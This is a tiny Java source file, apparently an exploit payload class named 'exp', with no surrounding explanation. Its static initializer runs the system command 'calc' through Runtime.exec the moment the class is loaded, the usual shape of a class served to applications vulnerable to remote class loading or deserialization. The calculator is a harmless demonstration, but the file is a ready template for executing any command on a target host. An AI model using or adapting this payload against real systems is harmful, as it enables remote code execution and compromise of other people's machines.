public class exp {
    static {
        try {
            String [] cmd={"calc"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}